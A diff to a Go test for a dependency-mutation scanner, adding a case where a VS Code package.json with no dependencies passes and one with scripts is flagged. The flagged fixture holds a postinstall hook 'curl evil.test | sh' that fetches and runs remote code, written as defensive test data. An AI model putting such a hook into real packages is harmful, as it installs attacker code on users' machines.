@@ -106,6 +106,32 @@ func TestScanLockedDependencyMutations_PackageJSONMetadataVsDeps(t *testing.T) {
 	if gotBadPy := ScanLockedDependencyMutations(nil, repoDir, true); len(gotBadPy) != 1 {
 		t.Fatalf("expected 1 violation for non-empty pyproject.toml dependencies, got %v", gotBadPy)
 	}
+
+	// 5. New zero-dep, zero-script packaging/vscode/package.json passes; adding scripts or deps fails closed.
+	if err := os.WriteFile(pyPath, []byte(zeroDepPy), 0644); err != nil {
+		t.Fatalf("restore clean pyproject.toml: %v", err)
+	}
+	vsPath := filepath.Join(repoDir, "packaging", "vscode", "package.json")
+	if err := os.MkdirAll(filepath.Dir(vsPath), 0755); err != nil {
+		t.Fatalf("mkdir packaging/vscode: %v", err)
+	}
+	zeroDepVs := "{\n  \"name\": \"nomos\",\n  \"publisher\": \"sophialabs\",\n  \"version\": \"4.34.1\",\n  \"main\": \"./extension.js\"\n}\n"
+	if err := os.WriteFile(vsPath, []byte(zeroDepVs), 0644); err != nil {
+		t.Fatalf("write zero-dep vscode package.json: %v", err)
+	}
+	if out, err := workspace.SafeGitCommand(repoDir, "add", "packaging/vscode/package.json").CombinedOutput(); err != nil {
+		t.Fatalf("git add vscode package.json: %v (%s)", err, string(out))
+	}
+	if gotVs := ScanLockedDependencyMutations(nil, repoDir, true); len(gotVs) != 0 {
+		t.Fatalf("expected 0 violations for zero-dep packaging vscode package.json, got %v", gotVs)
+	}
+	scriptVs := "{\n  \"name\": \"nomos\",\n  \"scripts\": { \"postinstall\": \"curl evil.test | sh\" }\n}\n"
+	if err := os.WriteFile(vsPath, []byte(scriptVs), 0644); err != nil {
+		t.Fatalf("write scripted vscode package.json: %v", err)
+	}
+	if gotBadVs := ScanLockedDependencyMutations(nil, repoDir, true); len(gotBadVs) != 1 {
+		t.Fatalf("expected 1 violation for packaging vscode package.json with scripts, got %v", gotBadVs)
+	}
 }
 
 func TestIsProhibitedEnvFileName(t *testing.T) {
